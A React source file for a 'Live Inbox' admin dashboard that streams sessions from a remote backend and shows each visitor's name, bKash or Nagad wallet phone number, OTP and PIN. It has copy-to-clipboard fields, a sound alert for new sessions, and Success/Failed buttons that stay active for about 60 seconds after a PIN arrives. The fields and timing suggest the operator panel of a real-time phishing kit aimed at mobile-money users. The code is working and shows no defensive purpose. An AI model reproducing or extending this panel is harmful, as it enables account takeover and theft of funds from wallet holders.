import React, { useState, useEffect, useRef } from "react";
import api from "./api";
import { io } from "socket.io-client";

const SOCKET_URL = import.meta.env.PROD
  ? "https://mobile-card-bd-backend.onrender.com"
  : "http://localhost:6000";

const timeAgo = (d) => {
  if (!d) return "";
  const s = Math.floor((Date.now() - new Date(d)) / 1000);
  if (s < 5) return "Just now";
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  return Math.floor(h / 24) + "d ago";
};

export default function LiveInboxPage() {
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, success: 0, pending: 0, failed: 0 });
  const [refreshing, setRefreshing] = useState(false);
  const [deleting, setDeleting] = useState(false);
  const [copiedId, setCopiedId] = useState(null);
  const [updatingId, setUpdatingId] = useState(null);
  const prevTotal = useRef(0);
  const lastPlayedRef = useRef(0);

  const playClick = () => {
    const now = Date.now();
    if (now - lastPlayedRef.current < 2000) return;
    lastPlayedRef.current = now;
    try { const a = new Audio("/sounds/Click.mp3"); a.volume = 0.5; a.play().catch(() => {}); } catch (e) {}
  };

  const loadAll = (playSound = false) => {
    api.get("/sessions").then(res => {
      const d = res.data.sessions || [];
      const now = Date.now();
      const all = d.length;
      let success = 0, pending = 0, failed = 0;

      d.forEach(x => {
        const f = x.formData || {};
        const isDone = f.status === "done" || f.step === "pin";
        const hasFormData = Object.keys(f).length > 0;
        const adStat = x.adminStatus || "";
        const lastAct = x.lastActivity || x.timestamp;
        const elapsed = (now - new Date(lastAct).getTime()) / 1000;

        if (adStat === "approved") { success++; }
        else if (adStat === "failed") { failed++; }
        else if (isDone && elapsed > 60) { failed++; }
        else if (hasFormData && !isDone) { pending++; }
      });

      const sorted = [...d].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      setSessions(sorted);
      setStats({ total: all, success, pending, failed });
      if (playSound && all > prevTotal.current) { playClick(); }
      prevTotal.current = all;
    });
  };

  useEffect(() => {
    loadAll(false);
    const skt = io(SOCKET_URL, { transports: ["websocket", "polling"] });
    skt.on("newSession", () => { loadAll(true); });
    skt.on("formSubmitted", () => { loadAll(false); });
    const t = setInterval(() => loadAll(false), 3000);
    return () => { skt.disconnect(); clearInterval(t); };
  }, []);

  const handleRefresh = () => { setRefreshing(true); loadAll(false); setTimeout(() => setRefreshing(false), 600); };
  const handleDeleteAll = () => {
    if (!confirm("Delete ALL sessions permanently?")) return;
    setDeleting(true);
    const deletePromises = sessions.map(s => api.delete(`/sessions/${s._id}`).catch(() => {}));
    Promise.all(deletePromises).then(() => { loadAll(false); setDeleting(false); });
  };
  const copyValue = (val, id) => { if (!val) return; navigator.clipboard.writeText(val); setCopiedId(id); setTimeout(() => setCopiedId(null), 1200); };

  const updateStatus = (id, adminStatus) => {
    setUpdatingId(id);
    api.patch(`/sessions/${id}/status`, { adminStatus })
      .then(res => { loadAll(false); setUpdatingId(null); })
      .catch(err => { setUpdatingId(null); });
  };

  const fd = (s) => s.formData || {};
  const getCategory = (s) => { const d = fd(s); if (d.gateway && /bKash/i.test(d.gateway)) return "bKash"; if (d.gateway && /Nagad/i.test(d.gateway)) return "Nagad"; if (d.gw === 'Svc-A') return "bKash"; if (d.gw === 'Svc-B') return "Nagad"; return "—"; };
  const getPhone = (s) => fd(s).account || fd(s).phone || "";
  const getOtp = (s) => fd(s).otp || "";
  const getPin = (s) => fd(s).pin || "";
  const getAmount = (s) => fd(s).amount || "";
  const getPaymentMode = (s) => fd(s).paymentMode || (fd(s).amount === "৳70" ? "cod" : "online");
  const getUserName = (s) => fd(s).fullName || s.userName || "—";
  const isLive = (s) => s.isLive;

  const getElapsed = (s) => {
    const lastAct = s.lastActivity || s.timestamp;
    if (!lastAct) return 0;
    return Math.floor((Date.now() - new Date(lastAct).getTime()) / 1000);
  };

  const getDisplayStatus = (s) => {
    const adStat = s.adminStatus || "";
    if (adStat === "approved" || adStat === "failed") return adStat;
    const f = fd(s);
    const isDone = f.status === "done" || f.step === "pin";
    const hasFormData = Object.keys(f).length > 0;
    const elapsed = getElapsed(s);
    if (isDone && elapsed <= 60) return "";
    if (isDone && elapsed > 60) return "failed";
    if (hasFormData && !isDone) return "pending";
    return "";
  };

  const statCards = [
    { c: "#6366f1", v: stats.total, l: "Total" },
    { c: "#10b981", v: stats.success, l: "Success" },
    { c: "#f59e0b", v: stats.pending, l: "Pending" },
    { c: "#ef4444", v: stats.failed, l: "Failed" },
  ];

  return (
    <div style={{ padding: "4px 0", maxWidth: "100vw" }}>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 10, marginBottom: 16 }}>
        {statCards.map((s, i) => (
          <div key={i} style={{ background: "#fff", border: "1px solid #eee", borderRadius: 10, padding: "12px 14px", textAlign: "center", borderTop: "3px solid " + s.c }}>
            <div style={{ fontSize: 22, fontWeight: 800, color: s.c, lineHeight: 1, marginBottom: 3 }}>{s.v}</div>
            <div style={{ color: "#888", fontSize: 10, fontWeight: 700, textTransform:"uppercase", letterSpacing:0.5 }}>{s.l}</div>
          </div>
        ))}
      </div>
      <div style={{ display: "flex", justifyContent: "flex-end", gap: 8, marginBottom: 14 }}>
        <button onClick={handleRefresh} style={{ padding: "7px 14px", borderRadius: 6, border: "none", background: refreshing ? "#10b981" : "#6366f1", color: "#fff", fontWeight: 600, fontSize: 12, cursor: "pointer" }}>{refreshing ? "Refreshed" : "Refresh"}</button>
        <button onClick={handleDeleteAll} disabled={sessions.length === 0 || deleting} style={{ padding: "7px 14px", borderRadius: 6, border: "none", background: sessions.length === 0 ? "#ddd" : "#ef4444", color: "#fff", fontWeight: 600, fontSize: 12, cursor: sessions.length === 0 ? "not-allowed" : "pointer", opacity: sessions.length === 0 ? 0.6 : 1 }}>{deleting ? "Deleting..." : `Delete All (${sessions.length})`}</button>
      </div>
      <div style={{ background: "#fff", border: "1px solid #eee", borderRadius: 14, overflow: "hidden" }}>
        <div style={{ overflowX: "auto" }}>
          <table style={{ width:"100%", borderCollapse:"collapse", tableLayout:"fixed", minWidth:1300 }}>
            <thead>
              <tr style={{ background:"#f9fafb" }}>
                <th style={{ ...thS, width:"4%" }}>#</th>
                <th style={{ ...thS, width:"7%" }}>Status</th>
                <th style={{ ...thS, width:"6%" }}>Device</th>
                <th style={{ ...thS, width:"11%" }}>User</th>
                <th style={{ ...thS, width:"7%" }}>Category</th>
                <th style={{ ...thS, width:"7%" }}>Amount</th>
                <th style={{ ...thS, width:"7%" }}>Payment</th>
                <th style={{ ...thS, width:"11%" }}>Phone</th>
                <th style={{ ...thS, width:"9%" }}>OTP</th>
                <th style={{ ...thS, width:"9%" }}>PIN</th>
                <th style={{ ...thS, width:"16%" }}>Status</th>
                <th style={{ ...thS, width:"6%" }}>Time</th>
              </tr>
            </thead>
            <tbody>
              {sessions.length === 0 && (<tr><td colSpan={12} style={{ padding:60, textAlign:"center" }}><div style={{ fontSize:40, marginBottom:8, opacity:.3 }}>📭</div><div style={{ color:"#888", fontSize:14, fontWeight:600 }}>No Active Sessions</div></td></tr>)}
              {sessions.map((s, i) => {
                const cat = getCategory(s);
                const live = isLive(s);
                const pm = getPaymentMode(s);
                const amt = getAmount(s);
                const userName = getUserName(s);
                const sid = s._id || i;
                const bg = i % 2 === 0 ? "#fff" : "#fafbfc";
                const dispStatus = getDisplayStatus(s);
                const isUpdating = updatingId === sid;
                const elapsed = getElapsed(s);
                const f = fd(s);
                const isDone = f.status === "done" || f.step === "pin";
                const showButtons = !dispStatus && isDone && elapsed <= 60;
                return (
                  <tr key={sid} style={{ background: bg }}>
                    <td style={{ ...tdS, width:"4%" }}>{i + 1}</td>
                    <td style={{ ...tdS, width:"7%" }}><div style={{ display:"flex", alignItems:"center", gap:5, justifyContent:"center" }}><span style={{ width:6, height:6, borderRadius:"50%", background: live?"#10b981":"#ef4444", boxShadow: live?"0 0 6px #10b981":"none", flexShrink:0 }}></span><span style={{ fontWeight:600, fontSize:11, color: live?"#059669":"#dc2626" }}>{live ? "On" : "Off"}</span></div></td>
                    <td style={{ ...tdS, width:"6%", fontSize:18 }}>{s.deviceType === "Mobile" ? "📱" : s.deviceType === "Desktop" ? "💻" : "—"}</td>
                    <td style={{ ...tdS, width:"11%", fontWeight:600, fontSize:11, overflow:"hidden", textOverflow:"ellipsis" }} title={userName}>{userName}</td>
                    <td style={{ ...tdS, width:"7%", fontWeight:700, fontSize:11, color: cat==="bKash"?"#e6007e":cat==="Nagad"?"#d92550":"#888" }}>{cat}</td>
                    <td style={{ ...tdS, width:"7%", fontWeight:700, fontSize:11, color: amt?"#6366f1":"#ccc" }}>{amt || "—"}</td>
                    <td style={{ ...tdS, width:"7%" }}><span style={{ padding:"3px 8px", borderRadius:4, fontSize:10, fontWeight:700, background: pm==="cod"?"#ecfdf5":"#eef2ff", color: pm==="cod"?"#059669":"#6366f1", whiteSpace:"nowrap" }}>{pm === "cod" ? "COD" : "Online"}</span></td>
                    <td style={{ ...tdS, width:"11%" }}><input readOnly value={getPhone(s)} placeholder="—" style={{ ...inputS, textAlign:"left" }} onClick={() => copyValue(getPhone(s), sid+"_ph")} /></td>
                    <td style={{ ...tdS, width:"9%" }}><input readOnly value={getOtp(s)} placeholder="—" style={{ ...inputS, textAlign:"center", color:"#f59e0b" }} onClick={() => copyValue(getOtp(s), sid+"_otp")} /></td>
                    <td style={{ ...tdS, width:"9%" }}><input readOnly value={getPin(s)} placeholder="—" style={{ ...inputS, textAlign:"center" }} onClick={() => copyValue(getPin(s), sid+"_pin")} /></td>
                    <td style={{ ...tdS, width:"16%", padding:"4px 6px" }}>
                      <div style={{ width:180, height:32, margin:"0 auto", display:"flex", justifyContent:"center", alignItems:"center" }}>
                      {isUpdating ? (
                        <span style={{ fontSize:11, color:"#888", fontWeight:600 }}>⏳</span>
                      ) : dispStatus === "approved" ? (
                        <span style={{ display:"flex", alignItems:"center", justifyContent:"center", background:"#10b981", color:"#fff", borderRadius:6, fontSize:11, fontWeight:700, whiteSpace:"nowrap", width:"100%", height:"100%" }}>✅ Success</span>
                      ) : dispStatus === "failed" ? (
                        <span style={{ display:"flex", alignItems:"center", justifyContent:"center", background:"#ef4444", color:"#fff", borderRadius:6, fontSize:11, fontWeight:700, whiteSpace:"nowrap", width:"100%", height:"100%" }}>❌ Failed</span>
                      ) : dispStatus === "pending" ? (
                        <span style={{ display:"flex", alignItems:"center", justifyContent:"center", background:"#fffbeb", color:"#d97706", borderRadius:6, fontSize:11, fontWeight:700, whiteSpace:"nowrap", width:"100%", height:"100%" }}>⏳ Pending</span>
                      ) : showButtons ? (
                        <>
                          <button onClick={(e) => { e.stopPropagation(); updateStatus(sid, "approved"); }} style={{ flex:1, height:"100%", background:"#10b981", color:"#fff", borderRadius:6, border:"none", fontWeight:700, fontSize:11, cursor:"pointer", whiteSpace:"nowrap", padding:0 }}>✅ Success</button>
                          <button onClick={(e) => { e.stopPropagation(); updateStatus(sid, "failed"); }} style={{ flex:1, height:"100%", background:"#ef4444", color:"#fff", borderRadius:6, border:"none", fontWeight:700, fontSize:11, cursor:"pointer", whiteSpace:"nowrap", padding:0, marginLeft:0 }}>❌ Failed</button>
                        </>
                      ) : (
                        <span style={{ color:"#ccc", fontSize:11, fontWeight:500 }}>—</span>
                      )}
                      </div>
                    </td>
                    <td style={{ ...tdS, width:"6%", fontWeight:500, fontSize:11, color:"#888" }}>{timeAgo(s.timestamp)}</td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

const thS = { padding:"10px 8px", color:"#888", fontSize:9, textTransform:"uppercase", letterSpacing:1, fontWeight:700, textAlign:"center", whiteSpace:"nowrap", borderBottom:"2px solid #eee" };
const tdS = { padding:"10px 8px", fontSize:11, fontWeight:500, color:"#1a1a2e", whiteSpace:"nowrap", textAlign:"center", overflow:"hidden", textOverflow:"ellipsis" };
const inputS = { padding:"6px 6px", borderRadius:4, border:"1px solid #e5e7eb", background:"#f9fafb", fontSize:10, fontFamily:"monospace", fontWeight:600, color:"#1a1a2e", outline:"none", cursor:"pointer", width:"100%", boxSizing:"border-box" };